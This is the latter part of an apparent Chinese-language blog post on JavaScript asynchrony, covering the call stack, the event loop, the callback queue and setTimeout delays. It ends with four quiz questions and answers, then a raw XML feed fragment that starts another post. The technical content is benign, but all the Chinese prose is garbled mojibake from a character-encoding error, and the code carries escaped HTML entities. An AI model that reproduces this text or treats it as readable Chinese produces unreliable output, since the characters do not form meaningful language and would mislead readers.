æˆ‘å€‘å…ˆå‘¼å«äº† cï¼Œæ‰€ä»¥ call stack é•·é€™æ¨£ï¼ˆåº•ä¸‹çš„ç¯„ä¾‹æœƒå¾€ä¸Šé•·ï¼‰ï¼š
c

c è£¡é¢å‘¼å«äº† bï¼š
bc

b è£¡é¢å†å‘¼å«äº† aï¼š
abc

ç•¶ a åŸ·è¡Œå®Œä¹‹å¾Œè¦å›åˆ°å“ªä¸€å€‹ function å‘¢ï¼Ÿå¾ˆç°¡å–®ï¼ŒæŠŠ a å¾ call stack ç§»é™¤ï¼Œåœ¨æœ€ä¸Šé¢çš„é‚£å€‹å°±æ˜¯äº†ï¼š
bc

æ¥è‘— b åŸ·è¡Œå®Œï¼Œå¾ call stack è£¡é¢æ‹¿å‡ºä¾†ï¼š
c

c åŸ·è¡Œå®Œï¼Œcall stack æ¸…ç©ºï¼Œç¨‹å¼åŸ·è¡ŒçµæŸã€‚
è¨˜éŒ„è‘— function åŸ·è¡Œé †åºä»¥åŠå…¶ä»–éœ€è¦çš„æ±è¥¿çš„åœ°æ–¹å°±æ˜¯ call stackï¼Œè€ŒçŸ¥åçš„éŒ¯èª¤ stack overflow æŒ‡çš„å°±æ˜¯ stack å¤ªå¤šæ±è¥¿æ»¿å‡ºä¾†äº†ï¼Œä¾‹å¦‚èªªä½ éè¿´å‘¼å«ä¸€å€‹ function åè¬æ¬¡ï¼Œstack æ²’è¾¦æ³•å­˜é€™éº¼å¤šæ±è¥¿ï¼Œæ–¼æ˜¯å°±ä¸Ÿå‡º stack overflow çš„éŒ¯èª¤ã€‚
JavaScript çš„ã€Œåªæœ‰ä¸€å€‹ threadã€æŒ‡çš„å°±æ˜¯åªæœ‰ä¸€å€‹ call stackï¼Œæ‰€ä»¥åŒä¸€å€‹æ™‚é–“åªèƒ½åŸ·è¡Œä¸€ä»¶äº‹æƒ…ã€‚
é‚£éåŒæ­¥åˆ°åº•æ˜¯æ€éº¼åšåˆ°çš„å‘¢ï¼Ÿ
æˆ‘åªèªªã€ŒJavaScript åŒä¸€å€‹æ™‚é–“åªèƒ½åŸ·è¡Œä¸€ä»¶äº‹ã€ï¼Œä½†æ˜¯ä¸¦æ²’æœ‰èªªã€ŒåŸ·è¡Œç’°å¢ƒä¹Ÿæ˜¯å¦‚æ­¤ã€ã€‚
ä¾‹å¦‚èªªè®€æª”å¥½äº†ï¼Œæˆ‘å€‘ä¸Šé¢æŠŠéåŒæ­¥è®€æª”çš„ç¨‹å¼ç¢¼è§£é‡‹ç‚ºï¼šã€Œå«ç³»çµ±å»è®€æª”ï¼Œè®€å®Œæª”ä¹‹å¾Œé€é callback function æŠŠçµæœå‚³å›ä¾†ã€ï¼Œåœ¨é€™èƒŒå¾Œ Node.js å¯ä»¥ç”¨å¦ä¸€å€‹ thread å»è®€å–æª”æ¡ˆï¼Œé€™æ˜¯å®Œå…¨æ²’æœ‰å•é¡Œçš„ã€‚
setTimeout ä¹Ÿæ˜¯å¦‚æ­¤ï¼ŒsetTimeout(fn, 2000) åªæ˜¯åœ¨å‘Šè¨´ç€è¦½å™¨èªªï¼šã€Œ2 ç§’ä»¥å¾Œå¹«æˆ‘å‘¼å« fn é€™å€‹ functionã€ï¼Œç€è¦½å™¨å°±å¯ä»¥é–‹å¦å¤–ä¸€å€‹ thread å»è¨ˆæ™‚ï¼Œè€Œä¸æ˜¯åˆ©ç”¨ main threadã€‚
é‡é»æ˜¯ï¼Œç•¶é€™äº›å…¶ä»– thread çš„äº‹æƒ…åšå®Œä»¥å¾Œï¼Œè¦æ€éº¼æ¨£é‡æ–°ä¸Ÿå› main threadï¼Ÿå› ç‚ºåªæœ‰ main thread å¯ä»¥åŸ·è¡Œ JavaScript å˜›ï¼Œæ‰€ä»¥ä¸€å®šè¦ä¸Ÿå›å»ï¼Œä¸ç„¶æ²’è¾¦æ³•è·‘ã€‚
é€™å°±æ˜¯ event loop åœ¨åšçš„äº‹æƒ…äº†ã€‚
å…ˆä¾†çœ‹ä¸€å¼µç¶“å…¸çš„åœ–ï¼š
ï¼ˆåœ–ç‰‡ä¾†æºï¼šUnderstanding Event Loop, Call Stack, Event &amp; Job Queue in Javascript è£¡é¢é™„çš„ codepen æˆªåœ–ï¼‰
æˆ‘å€‘å…ˆä¾†è§£é‡‹å³åŠéƒ¨ï¼Œå‡è¨­æˆ‘å€‘åŸ·è¡Œäº† setTimeout(fn, 2000) é€™ä¸€è¡Œç¨‹å¼ç¢¼ï¼Œæœƒå…ˆæŠŠ setTimeout(fn, 2000) ä¸Ÿåˆ° call stack å»åŸ·è¡Œï¼Œç„¶å¾Œ setTimeout å±¬æ–¼ Web APIï¼Œæ‰€ä»¥æœƒè·Ÿç€è¦½å™¨èªªï¼šã€Œæ¬¸æ¬¸ï¼Œå¹«æˆ‘è¨­å®šä¸€å€‹è¨ˆæ™‚å™¨ï¼Œ2000 æ¯«ç§’ä»¥å¾Œå‘¼å« fnã€ï¼Œç„¶å¾Œå°±åŸ·è¡ŒçµæŸï¼Œå¾ call stack è£¡é¢ pop æ‰ã€‚
ç•¶ç€è¦½å™¨çš„è¨ˆæ™‚å™¨æ™‚é–“ä¸€åˆ°ï¼Œå°±æœƒæŠŠ fn é€™å€‹ function ä¸Ÿé€²å» callback queueï¼Œç‚ºä»€éº¼é€™é‚Šè¦æœ‰ä¸€å€‹ queue å‘¢ï¼Ÿå› ç‚ºå¯èƒ½æœƒæœ‰å¾ˆå¤š callback function éƒ½åœ¨ç­‰å¾…åŸ·è¡Œå˜›ï¼Œæ‰€ä»¥éœ€è¦æœ‰ä¸€å€‹æ’éšŠæ©Ÿåˆ¶è®“å¤§å®¶åœ¨é€™é‚Šæ’éšŠï¼Œä¸€å€‹ä¸€å€‹æ…¢æ…¢ä¾†ï¼Œæ‰€ä»¥æ‰å«åš callback queueï¼Œè€Œä¸æ˜¯ callback array æˆ–æ˜¯ callback stackã€‚
æ¥è‘—å°±æ˜¯é‡é» event loop äº†ï¼Œå®ƒæ‰®æ¼”çš„è§’è‰²å¾ˆç°¡å–®ï¼Œç”¨ç™½è©±æ–‡è¬›å°±æ˜¯ï¼š

ä¸æ–·åµæ¸¬ call stack æ˜¯å¦ç‚ºç©ºï¼Œå¦‚æœæ˜¯ç©ºçš„è©±å°±æŠŠ callback queue è£¡é¢çš„æ±è¥¿ä¸Ÿåˆ° call stack

ä»¥ç¨‹å¼çš„è§’åº¦å»æƒ³ï¼Œevent loop ä¹‹æ‰€ä»¥å«åš loopï¼Œå°±æ˜¯å› ç‚ºå®ƒå¯ä»¥è¡¨ç¤ºæˆé€™æ¨£ï¼š
while(true) &#123;  if (callStack.length === 0 &amp;&amp; callbackQueue.length &gt; 0) &#123;    // æ‹¿å‡º callbackQueue çš„ç¬¬ä¸€å€‹å…ƒç´ ï¼Œä¸¦æ”¾åˆ° callStack å»    callStack.push(callbackQueue.dequeue())  &#125;&#125;

å°±æ˜¯é€™æ¨£å­è€Œå·²ï¼Œå°±æ˜¯é‚£éº¼ç°¡å–®ã€‚
é€™å°±å¥½åƒå¾ˆå¤šçŸ¥åçš„åšç‰©é¤¨éƒ½æœ‰äººæ•¸ç®¡åˆ¶ï¼Œä½ å¾—å…ˆå»è²·ç¥¨ï¼Œè²·ç¥¨å®Œä»¥å¾Œå»æ’éšŠã€‚æ¥è‘—é–€å£çš„è­¦è¡›çœ‹åˆ°å‰é¢çš„äººéƒ½å·²ç¶“åˆ°ä¸‹ä¸€å€‹æ™¯é»äº†ï¼Œæ‰æœƒæŠŠéšŠä¼è£¡é¢çš„äººæ”¾é€²ä¾†ã€‚
while(true) &#123;  if (åšç‰©é¤¨å…¥å£æ²’æœ‰äºº &amp;&amp; æ’éšŠçš„éšŠä¼æœ‰äºº) &#123;    æ”¾äººé€²å»åšç‰©é¤¨()  &#125;&#125;

é€™é‚Šåªè¦æŒæ¡ä¸€å€‹é‡é»å°±å¥½ï¼šã€ŒéåŒæ­¥çš„ callback function æœƒå…ˆè¢«æ”¾åˆ° callback queueï¼Œä¸¦ä¸”ç­‰åˆ° call stack ç‚ºç©ºæ™‚å€™æ‰è¢« event loop ä¸Ÿé€²å» call stackã€
Event loop å°±æ˜¯é‚£ç¨®åªæœƒå‡ºä¸€å¼µå˜´ä¸æœƒåšäº‹çš„äººï¼Œå®ƒä¸è² è²¬å¹«ä½ åŸ·è¡Œ callback functionï¼Œåªæœƒå¹«ä½ æŠŠ function ä¸Ÿåˆ° call stackï¼ŒçœŸæ­£åœ¨åŸ·è¡Œçš„é‚„æ˜¯ JavaScript çš„ main threadã€‚
ç†è§£ event loop é€™å€‹æ©Ÿåˆ¶ä¹‹å¾Œï¼Œå°±å¯ä»¥ä¾†è§£é‡‹éåŒæ­¥çš„è¡Œç‚ºäº†ï¼Œé€™é‚Šå½±ç‰‡è£¡é¢å·²ç¶“è§£é‡‹å¾—å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘å°±ä¸å†å¤šè¬›äº†ï¼Œæˆ‘åªèˆ‰ä¸€å€‹å¸¸è¦‹çš„ç¯„ä¾‹ï¼š
setTimeout(() =&gt; &#123;  console.log(&#x27;0ms&#x27;)&#125;, 0)console.log(&#x27;hello&#x27;)

è«‹å•æ˜¯ hello æœƒå…ˆè¢«å°å‡ºä¾†ï¼Œé‚„æ˜¯ 0ms æœƒå…ˆè¢«å°å‡ºä¾†ï¼Œé‚„æ˜¯ä¸ä¸€å®šï¼Ÿ
å¦‚æœä½ çš„ç­”æ¡ˆä¸æ˜¯ã€Œhello æœƒå…ˆè¢«å°å‡ºä¾†ã€ï¼Œå°±ä»£è¡¨å…¶å¯¦æ²’æœ‰ç†è§£ event loop é€™å€‹æ©Ÿåˆ¶ï¼Œéº»ç…©å›å»æŠŠå½±ç‰‡é‡çœ‹ä¸€éã€‚
ä¸Šé¢çš„ç¯„ä¾‹ä¸­é‚£å€‹ callback function æœƒåœ¨ 0ms ä¹‹å¾Œè¢«æ”¾åˆ° callback queue å»ï¼Œä½†è«‹æ³¨æ„ï¼Œé€™æ™‚å€™ call stack é‚„ä¸æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥ console.log(&#39;hello&#39;) æœƒå…ˆè¢«åŸ·è¡Œï¼ŒåŸ·è¡Œå®Œä¹‹å¾Œ call stack æ¸…ç©ºï¼Œevent loop æ‰æŠŠ callback æ”¾åˆ° call stackï¼Œç„¶å¾Œæ‰åŸ·è¡Œ callback è£¡é¢çš„ console.log(&#39;0ms&#39;)ã€‚
æ‰€ä»¥è¼¸å‡ºçš„é †åºä¿è­‰æœƒæ˜¯ hello å…ˆï¼Œå†ä¾†æ‰æ˜¯ 0msã€‚
æœ€å¾Œåšå¹¾å€‹å°è£œå……ï¼Œç¬¬ä¸€å€‹æ˜¯ setTimeout å‚³ 0 åªæ˜¯ä»£è¡¨ã€Œå„˜å¿«åŸ·è¡Œã€ï¼Œä¸ä¸€å®šåœ¨ 0ms ä»¥å¾Œå°±æœƒè§¸ç™¼ï¼Œå¯èƒ½æœƒæ˜¯ 4ms æˆ–æ˜¯æ›´é•·ï¼Œè©³æƒ…å¯åƒè€ƒï¼šMDN: Reasons for delays longer than specified
ç¬¬äºŒå€‹è£œå……æ˜¯ event loop å…¶å¯¦é‚„æœ‰ä¸€å€‹å°ç´°ç¯€ï¼Œé‚£å°±æ˜¯ callback queue é‚„å€åˆ†æˆ macro task è·Ÿ micro task å…©ç¨®ï¼Œä½†é€™å€‹æœ‰é»å°è¤‡é›œï¼Œä»¥å¾Œæœ‰æ©Ÿæœƒå†èªªã€‚
ç¬¬ä¸‰å€‹è£œå……æ˜¯é›–ç„¶ Node.js è·Ÿç€è¦½å™¨éƒ½æœ‰ event loopï¼Œä½†å°±åƒé€™å…©å€‹åŸ·è¡Œç’°å¢ƒéƒ½æœ‰ setTimeout ä¸€æ¨£ï¼ŒèƒŒå¾Œçš„åŸç†è·Ÿå¯¦ä½œæ˜¯ä¸åŒçš„ã€‚å¤§è‡´ä¸Šç›¸åŒï¼Œä½†æ˜¯ç´°ç¯€ä¸åŒã€‚
ç¬¬å››å€‹è£œå……æ˜¯ä¸Šé¢æåˆ°çš„ã€Œåªæœ‰ main thread å¯ä»¥åŸ·è¡Œ JavaScriptã€å…¶å¯¦ä¸æ­£ç¢ºï¼Œå› ç‚ºåœ¨ç€è¦½å™¨è£¡é¢æœ‰ Web Worker å¯ä»¥ç”¨ã€‚
éåŒæ­¥å°æ¸¬é©—åœ¨ç†è§£äº†éåŒæ­¥çš„åŸç† event loop ä¹‹å¾Œï¼Œç…§ç†ä¾†èªªä½ æ‡‰è©²è¦å°éåŒæ­¥çš„åŸ·è¡Œç›¸ç•¶ç†Ÿæ‚‰äº†ï¼Œåº•ä¸‹æˆ‘æœƒçµ¦å‡ºå¹¾å€‹é¡Œç›®ï¼Œè®“ä½ é©—è­‰ä¸€ä¸‹è‡ªå·±æ˜¯å¦æœ‰çœŸçš„ç†è§£ï¼š
1. æ´»å‹•ç¶²ç«™å°æ˜åœ¨ä¸€é–“å°ˆé–€è¾¦æ´»å‹•çš„ç¶²ç«™æ“”ä»»å‰ç«¯å·¥ç¨‹å¸«ï¼Œè¢«ä¸»ç®¡æŒ‡æ´¾ä¸€å€‹ä»»å‹™ï¼Œé‚£å°±æ˜¯è¦åŠ ä¸€æ®µç¨‹å¼ç¢¼ï¼Œå‘¼å«å¾Œç«¯ API ä¾†å–å¾—ã€Œæ´»å‹•æ˜¯å¦å·²ç¶“é–‹å§‹ã€ï¼Œé–‹å§‹çš„è©±æ‰å‰å¾€æ´»å‹•é ï¼Œå¦å‰‡å°±ä¸åšä»»ä½•äº‹ã€‚
å‡è¨­getAPIResponseæ˜¯ä¸€å€‹éåŒæ­¥çš„ functionï¼Œæœƒåˆ©ç”¨ ajax å»å‘¼å« API ä¹‹å¾Œå–å¾—çµæœï¼Œè€Œ/eventé€™å€‹ API æœƒå›å‚³ JSON æ ¼å¼çš„è³‡æ–™ï¼Œå…¶ä¸­startedé€™å€‹ boolean çš„æ¬„ä½ä»£è¡¨è‘—æ´»å‹•æ˜¯å¦å·²ç¶“é–‹å§‹ã€‚
æ–¼æ˜¯å°æ˜å¯«å‡ºä»¥ä¸‹ç¨‹å¼ç¢¼ï¼š
// å…ˆè¨­ä¸€å€‹ flag ä¸¦ä¸”è¨­ç‚º falseï¼Œè¡¨ç¤ºæ´»å‹•æ²’é–‹å§‹let isEventStarted = false  // call API ä¸¦å–å¾—çµæœgetAPIResponse(&#x27;/event&#x27;, response =&gt; &#123;  // åˆ¤æ–·æ´»å‹•æ˜¯å¦é–‹å§‹ä¸¦è¨­ç½® flag  if (response.started) &#123;    isEventStarted = true  &#125;&#125;)  // æ ¹æ“š flag æ±ºå®šæ˜¯å¦å‰å¾€æ´»å‹•é é¢if (isEventStarted) &#123;  goToEvent()&#125;

è«‹å•ï¼šé€™æ®µç¨‹å¼ç¢¼æœ‰æ²’æœ‰å•é¡Œï¼Ÿå¦‚æœæœ‰çš„è©±ï¼Œå•é¡Œåœ¨å“ªè£¡ï¼Ÿ
2. æ…¢æ…¢ç­‰åœ¨å®Œæˆäº†æ´»å‹•ç¶²é ä¹‹å¾Œï¼Œå°æ˜è¦ºå¾—è‡ªå·±å°éåŒæ­¥å¥½åƒé‚„æ˜¯æ²’æœ‰é‚£éº¼ç†Ÿæ‚‰ï¼Œæ–¼æ˜¯å°±æƒ³ä¾†åšå€‹ç·´ç¿’ï¼Œå¯«å‡ºäº†åº•ä¸‹çš„ç¨‹å¼ç¢¼ï¼š
let gotResponse = falsegetAPIResponse(&#x27;/check&#x27;, () =&gt; &#123;  gotResponse = true  console.log(&#x27;Received response!&#x27;)&#125;)  while(!gotResponse) &#123;  console.log(&#x27;Waiting...&#x27;)&#125;

æ„æ€å°±æ˜¯åœ¨ ajax çš„ response å›ä¾†ä¹‹å‰æœƒä¸æ–·å°å‡º waitingï¼Œç›´åˆ°æ¥æ”¶åˆ° response æ‰åœæ­¢ã€‚
è«‹å•ï¼šä»¥ä¸Šå¯«æ³•å¯ä»¥æ»¿è¶³å°æ˜çš„éœ€æ±‚å—ï¼Ÿå¦‚æœä¸è¡Œï¼Œè«‹è©³è¿°åŸå› ã€‚
3. è©­ç•°çš„è¨ˆæ™‚å™¨å°æ˜è¢«ä¸»ç®¡æŒ‡æ´¾è¦å»è§£ä¸€å€‹ bugï¼Œåœ¨å…¬å¸çš„ç¨‹å¼ç¢¼è£¡é¢æ‰¾åˆ°äº†é€™ä¸€æ®µï¼š
setTimeout(() =&gt; &#123;  alert(&#x27;Welcome!&#x27;)&#125;, 1000)// å¾Œé¢é‚„æœ‰å…¶ä»–ç¨‹å¼ç¢¼ï¼Œé€™é‚Šå…ˆç•¥é

é€™å€‹ bug æ˜¯ä»€éº¼å‘¢ï¼Ÿå°±æ˜¯é€™å€‹è¨ˆæ™‚å™¨æ˜æ˜æŒ‡å®šèªª 1 ç§’ä¹‹å¾Œè¦è·³å‡ºè¨Šæ¯ï¼Œå¯æ˜¯åŸ·è¡Œé€™æ•´æ®µç¨‹å¼ç¢¼ï¼ˆæ³¨æ„ï¼Œåº•ä¸‹é‚„æœ‰å…¶ä»–ç¨‹å¼ç¢¼ï¼Œåªæ˜¯ä¸Šé¢å…ˆç•¥éè€Œå·²ï¼‰ä»¥å¾Œï¼Œalert å»åœ¨ 2 ç§’ä»¥å¾Œæ‰è·³å‡ºä¾†ã€‚
è«‹å•ï¼šé€™æœ‰å¯èƒ½ç™¼ç”Ÿå—ï¼Ÿç„¡è«–ä½ è¦ºå¾—å¯èƒ½æˆ–ä¸å¯èƒ½ï¼Œéƒ½è«‹è©¦è‘—è§£é‡‹åŸå› ã€‚
4. åŸ·è¡Œé †åºå¤§è€ƒé©—a(function() &#123;  console.log(&#x27;a&#x27;)&#125;)console.log(&#x27;hello&#x27;)

è«‹å•ï¼šæœ€å¾Œçš„è¼¸å‡ºé †åºç‚ºä½•ï¼Ÿæ˜¯å…ˆ hello å† aï¼Œé‚„æ˜¯å…ˆ a å† helloï¼Œé‚„æ˜¯ä¸ä¸€å®šï¼Ÿ

åº•ä¸‹æœƒé‡å°æ¯ä¸€é¡Œä¾†åšè§£ç­”ï¼Œå¼·çƒˆå»ºè­°ä¸Šé¢å››é¡Œè‡ªå·±æ€è€ƒå®Œä»¥å¾Œå†å¾€ä¸‹æ»‘ã€‚
è§£ç­”ï¼š1. æ´»å‹•ç¶²ç«™ç­”æ¡ˆæ˜¯æœ‰å•é¡Œï¼Œé€™æ•´æ®µç¨‹å¼ç¢¼æŠŠåŒæ­¥èˆ‡éåŒæ­¥æ··è‘—å¯«ï¼Œæ˜¯æœ€å¸¸è¦‹çš„éŒ¯èª¤ã€‚
è¦ç­‰ call stack æ¸…ç©ºä»¥å¾Œï¼Œevent loop æ‰æœƒæŠŠ callback ä¸Ÿåˆ° call stackï¼Œæ‰€ä»¥æœ€å¾Œåˆ¤æ–· isEventStarted çš„é€™ä¸€æ®µç¨‹å¼ç¢¼æœƒå…ˆè¢«åŸ·è¡Œã€‚ç•¶åŸ·è¡Œåˆ°é€™ä¸€æ®µçš„æ™‚å€™ï¼Œå„˜ç®¡ response å·²ç¶“å›ä¾†äº†ï¼Œä½† callback function é‚„åœ¨ callback queue è£¡é¢å¾…è‘—ï¼Œæ‰€ä»¥åˆ¤æ–·isEventStartedçš„æ™‚å€™ä¸€å®šæœƒæ˜¯ falseã€‚
æ­£ç¢ºçš„æ–¹æ³•æ˜¯æŠŠåˆ¤æ–·æ´»å‹•æ˜¯å¦é–‹å•Ÿçš„é‚è¼¯æ”¾åœ¨ callback è£¡é¢ï¼Œå°±å¯ä»¥ç¢ºä¿æ‹¿åˆ° response ä»¥å¾Œæ‰åšåˆ¤æ–·ï¼š
// call API ä¸¦å–å¾—çµæœgetAPIResponse(&#x27;/event&#x27;, response =&gt; &#123;  // åˆ¤æ–·æ´»å‹•æ˜¯å¦é–‹å§‹ä¸¦è¨­ç½® flag  if (response.started) &#123;    goToEvent()  &#125;&#125;)

è§£ç­”ï¼š2. æ…¢æ…¢ç­‰ç­”æ¡ˆæ˜¯ä¸è¡Œã€‚
é‚„è¨˜å¾— event loop çš„æ¢ä»¶å—ï¼Ÿã€Œç•¶ call stack ç‚ºç©ºï¼Œæ‰æŠŠ callback ä¸Ÿåˆ° call stackã€ã€‚
while(!gotResponse) &#123;  console.log(&#x27;Waiting...&#x27;)&#125;

é€™ä¸€æ®µç¨‹å¼ç¢¼æœƒä¸æ–·åŸ·è¡Œï¼Œæˆç‚ºä¸€å€‹ç„¡çª®è¿´åœˆã€‚æ‰€ä»¥ call stack æ°¸é éƒ½æœ‰æ±è¥¿ï¼Œä¸€ç›´è¢«ä½”ç”¨ï¼Œcallback queue è£¡é¢çš„æ±è¥¿æ ¹æœ¬ä¸Ÿä¸é€² call stackã€‚
å› æ­¤å°æ˜åŸæœ¬çš„ç¨‹å¼ç¢¼ç„¡è«–æœ‰æ²’æœ‰æ‹¿åˆ° responseï¼Œéƒ½åªæœƒä¸€ç›´å°å‡º waitingã€‚
è§£ç­”ï¼š3. è©­ç•°çš„è¨ˆæ™‚å™¨ç­”æ¡ˆæ˜¯æœ‰å¯èƒ½ã€‚
WebAPI æœƒåœ¨ä¸€ç§’ä¹‹å¾ŒæŠŠ callback ä¸Ÿåˆ° callback queueï¼Œé‚£ç‚ºä»€éº¼å…©ç§’ä¹‹å¾Œæ‰æœƒåŸ·è¡Œå‘¢ï¼Ÿå› ç‚ºé€™ä¸€ç§’ call stack è¢«ä½”ç”¨äº†ã€‚
åªè¦ setTimeout åº•ä¸‹çš„ç¨‹å¼ç¢¼åšäº†å¾ˆå¤šäº‹æƒ…ä¸¦ä½”ç”¨äº†ä¸€ç§’é˜ï¼Œcallback å°±æœƒåœ¨ä¸€ç§’ä¹‹å¾Œæ‰è¢«ä¸Ÿåˆ° call stack å»ï¼Œä¾‹å¦‚èªªï¼š
setTimeout(() =&gt; &#123;  alert(&#x27;Welcome!&#x27;)&#125;, 1000)  // åº•ä¸‹é€™æ®µç¨‹å¼ç¢¼æœƒåœ¨ call stack ä½”ç”¨ä¸€ç§’é˜const end = +new Date() + 1000while(end &gt; new Date())&#123;  &#125;

æ‰€ä»¥ setTimeout åªèƒ½ä¿è­‰ã€Œè‡³å°‘ã€æœƒåœ¨ 1 ç§’å¾ŒåŸ·è¡Œï¼Œä½†ä¸èƒ½ä¿è­‰ 1 ç§’çš„æ™‚å€™ä¸€å®šåŸ·è¡Œã€‚
è§£ç­”ï¼š4. åŸ·è¡Œé †åºå¤§è€ƒé©—ç­”æ¡ˆæ˜¯ä¸ä¸€å®šã€‚
å› ç‚ºæˆ‘æ²’æœ‰èªªaæ˜¯åŒæ­¥é‚„æ˜¯éåŒæ­¥çš„ï¼Œä½ ä¸è¦çœ‹åˆ° callback å°±ä»¥ç‚ºæ˜¯éåŒæ­¥ã€‚
æˆ‘çš„ a å¯ä»¥é€™æ¨£å¯¦ä½œï¼š
function a(fn) &#123;  fn() // åŒæ­¥åŸ·è¡Œ fn&#125;  a(function() &#123;  console.log(&#x27;a&#x27;)&#125;)console.log(&#x27;hello&#x27;)

è¼¸å‡ºå°±æœƒæ˜¯ a ç„¶å¾Œ helloã€‚
ä¹Ÿå¯ä»¥é€™æ¨£å¯¦ä½œï¼š
function a(fn) &#123;  setTimeout(fn, 0) // éåŒæ­¥åŸ·è¡Œ fn&#125;  a(function() &#123;  console.log(&#x27;a&#x27;)&#125;)console.log(&#x27;hello&#x27;)

è¼¸å‡ºå°±æ˜¯ hello ç„¶å¾Œæ‰ aã€‚
çµèªæƒ³è¦ç†è§£éåŒæ­¥çš„è©±å¿…é ˆä¸€æ­¥ä¸€æ­¥ä¾†ï¼Œä¸è¦æƒ³è‘—ä¸€æ­¥ç™»å¤©ã€‚
é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æ¨™é¡Œæœƒå«åšã€Œå…ˆæˆç‚º callback å¤§å¸«ã€ï¼Œå› ç‚ºä½ å¾—å…ˆå° callback æœ‰ä¸€å®šçš„ç†Ÿç·´ç¨‹åº¦ä¹‹å¾Œæ‰èƒ½é€²å…¥ä¸‹ä¸€å€‹éšæ®µï¼Œé€™æ¨£æœƒå®¹æ˜“å¾ˆå¤šã€‚
é€™ä¸€ç¯‡ä¸»è¦æ˜¯æƒ³å¹«å¤§å®¶å»ºç«‹èµ·å¹¾å€‹é‡è¦çš„è§€å¿µï¼š

ä»€éº¼æ˜¯é˜»å¡ï¼Ÿä»€éº¼æ˜¯éé˜»å¡ï¼Ÿ
ä»€éº¼æ˜¯åŒæ­¥ï¼Ÿä»€éº¼æ˜¯éåŒæ­¥ï¼Ÿ
åŒæ­¥èˆ‡éåŒæ­¥çš„å·®åˆ¥åœ¨å“ªè£¡ï¼Ÿ
ç‚ºä»€éº¼éœ€è¦éåŒæ­¥ï¼Ÿ
callback æ˜¯ä»€éº¼ï¼Ÿ
ç‚ºä»€éº¼éœ€è¦ callbackï¼Ÿ
callback çš„ error first æ…£ä¾‹
ä»€éº¼æ˜¯ event loopï¼Ÿå®ƒåšäº†ä»€éº¼ï¼Ÿ
éåŒæ­¥å¸¸è¦‹çš„å‘æœ‰å“ªäº›ï¼Ÿ

è‹¥æ˜¯èƒ½å¤ å®Œå…¨ç†è§£é€™ç¯‡ï¼Œä¸¦ä¸”æŠŠæ–‡æœ«çš„å°æ¸¬é©—å¾¹åº•ææ‡‚ï¼Œæˆ‘ç›¸ä¿¡ä½ å°éåŒæ­¥çš„ç†è§£æ‡‰è©²å°±æ²’ä»€éº¼å•é¡Œäº†ï¼Œå¯¦ä½œä¸Šä¹Ÿèƒ½é †åˆ©è¨±å¤šã€‚åœ¨ç†è§£éåŒæ­¥åŸºç¤ä»¥åŠ callback ä¹‹å¾Œï¼Œä¸‹ä¸€ç¯‡å°‡æœƒè¬›åˆ°ä½¿ç”¨ callback function æœƒç¢°åˆ°çš„å•é¡Œä»¥åŠè§£æ±ºæ–¹æ¡ˆï¼šPromiseï¼Œä¹Ÿæœƒç¨å¾®æä¸€ä¸‹æ¯”è¼ƒæ–°çš„èªæ³• async&#x2F;awaitã€‚
ï¼ˆç›®å‰é‚„æ²’æœ‰ä¸‹é›†ï¼Œæœ‰äº†ä¹‹å¾Œæˆ‘æœƒè£œä¸Šï¼‰
åƒè€ƒè³‡æ–™ï¼š

Overview of Blocking vs Non-Blocking
What are callbacks?
What are the error conventions?
ä½ æ‡‚ JavaScript å—ï¼Ÿ#23 Callback
What the heck is the event loop anyway? | Philip Roberts | JSConf EU

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥æ¢è¨ JavaScript ä¸­çš„åƒæ•¸å‚³éï¼šcall by value é‚„æ˜¯ referenceï¼Ÿ</title>
    <url>/2018/06/23/javascript-call-by-value-or-reference/</url>
    <content><![CDATA[å‰è¨€å…¶å¯¦é€™é€±åŸæœ¬æ˜¯è¦ä¾†å¯«æ·ºæ‹·è²è·Ÿæ·±æ‹·è²çš„å·®ç•°ä»¥åŠå¯¦ä½œï¼Œä½†åœ¨æ‰¾è³‡æ–™çš„æ™‚å€™ç„¡æ„é–“åˆçœ‹åˆ° call by value èˆ‡ call by reference ç›¸é—œçš„æ–‡ç« ï¼Œè¶Šç ”ç©¶ç™¼ç¾è¶Šæœ‰è¶£ã€‚åŸæœ¬ä»¥ç‚ºè‡ªå·±å·²ç¶“ææ‡‚äº†é€™å€‹å•é¡Œï¼Œä½†æ²’æƒ³åˆ°çœ‹çš„è³‡æ–™è¶Šå¤šï¼Œå»æŠŠè‡ªå·±å¼„çš„è¶Šç³Šå¡—ã€‚
è¦å¯«é€™ç¯‡æ–‡ç« å…¶å¯¦æœ‰å…©å€‹ä¸åŒçš„æ–¹å¼ï¼Œä¸€å€‹æ˜¯è©³å¯¦è¨˜éŒ„æˆ‘ç ”ç©¶é€™å€‹å•é¡Œçš„éç¨‹ä»¥åŠå¿ƒä¸­çš„ç–‘æƒ‘ï¼Œä»¥åŠæœ€å¾Œå¦‚ä½•å¾—åˆ°è§£ç­”ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æŒ‰ç…§æ™‚é–“è»¸ä¾†å¯«ï¼›å¦å¤–ä¸€å€‹æ˜¯ç•¶æˆ‘ç ”ç©¶å®Œä»¥å¾Œï¼Œå†é‡æ–°ä»¥è‡ªå·±çš„æ–¹å¼æ•´ç†ï¼Œä¸¦ä¸”ç”¨æ›´ç°¡å–®æ˜“æ‡‚çš„æ–¹å¼ä¾†è¡¨é”ã€‚
ä»¥å¾€æˆ‘çš„æ–‡ç« å¤§å¤šæ•¸éƒ½èµ°ç¬¬äºŒç¨®è·¯ç·šï¼Œé‡æ–°æ­¸ç´æ•´ç†éå¾Œå†å¯«å‡ºä¸€ç¯‡ç›¸å°ä¸Šæ›´å®¹æ˜“ç†è§£çš„æ–‡ç« ï¼Œç”¨æˆ‘çš„æ–¹å¼å¸¶è‘—å¤§å®¶ä¸€æ­¥æ­¥è·Ÿè‘—æˆ‘çš„è„ˆçµ¡å»æ¢è¨å•é¡Œæœ€å¾Œå¾—å‡ºè§£ç­”ã€‚
